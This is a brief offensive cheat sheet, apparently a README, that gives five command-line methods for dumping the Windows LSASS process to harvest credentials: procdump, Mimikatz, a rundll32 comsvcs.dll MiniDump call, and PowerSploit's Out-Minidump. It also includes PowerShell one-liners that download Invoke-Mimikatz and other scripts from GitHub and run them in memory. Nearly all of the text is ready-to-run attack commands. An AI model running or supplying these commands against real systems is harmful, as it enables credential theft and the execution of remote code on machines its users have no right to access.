# Methods to Dump LSASS

## 1. Procdump:
Procdump is a part of Microsoft Sysinternals and a command-line<br>utility programs for producing dumps of any running process<br>
We can leverage it and use it fo DUMP lsass process by the following:<br>
<code>procdump.exe -ma lsass.exe C:\path\lsass.dmp</code>

## 2. Mimikatz:
Mimikatz can both dump the LSASS process and read from an LSASS dump:<br>
<code>privilege::debug = Debugging Mode
sekurlsa::logonPasswords = Dump passwords
</code>

* To Read from an LSASS dump:<br>
<code>sekurlsa::minidump C:\path\lsass.dmp
sekurlsa::logonpasswords</code>

## 3. Rundll32
This is a native Windows utility method which can we can use:<br>
<code>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_Process_ID> C:\path</code><br>
to get lsass process ID, you can you "Get-Process lsass" on powershell.

## 4. PowerSploit's Out-Minidump:
Ensure the Out-Minidump function is loaded in your PowerShell session<br>
<code>"IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1')"
Get-Process lsass | Out-Minidump -DumpFilePath C:\Path\To\Dump
</code>

##  5. Using Invoke-Mimikatz from the GitHub Repository:
Download & Import the Script:
First, you need to get the Invoke-Mimikatz.ps1 script from the GitHub repository.
If you're working directly on the machine:
<code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/InvokeMimikatz/master/Invoke-Mimikatz.ps1')</code><br>

Invoke Mimikatz to Dump LSASS:<br>
Once the module is imported, you can run Invoke-Mimikatz to dump the LSASS</br>

<code>Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords"'</code><br>
* You can also using minidump module to select where to read:<br>
code> Invoke-Mimikatz -Command '"provolege::debug" "sekurlsa::minidump C:\Path\To\Load\Lsass"'
